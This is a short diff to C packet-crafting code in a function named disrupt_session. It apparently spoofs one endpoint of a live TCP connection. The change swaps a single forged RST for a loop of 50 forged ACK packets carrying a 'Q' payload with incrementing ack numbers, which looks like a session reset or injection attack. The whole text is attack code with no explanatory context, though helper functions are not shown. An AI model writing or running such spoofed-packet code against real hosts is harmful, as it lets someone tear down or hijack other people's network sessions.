@@ -137,16 +137,19 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     addr_in.sin_port = htons(destinationPort);
     addr_in.sin_addr.s_addr = inet_addr(destinationIP);
 
+
+int z = 50;
+while(z--){
     fill_packet(destinationIP,
                 sourceIP,
                 sourcePort,
                 destinationPort,
                 SYN_OFF,
                 ACK_ON,
-                ackNumber + ack_inc,
-                sequenceNumber + seq_inc,
-                RESET_ON,
-                "",
+                ackNumber++,
+                sequenceNumber,
+                RESET_OFF,
+                "Q",
                 packet,
                 sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 + 12);
 
@@ -175,9 +178,13 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     nopPtr++;
     *nopPtr = 0x01;
     nopPtr++;
+    *nopPtr = 'Q';
+    nopPtr++;
+    *nopPtr = '\0';
 
     // Send out the packet
     send_packet(sock, packet, addr_in);
+}
 
     if(finalRound){
         exit(0);
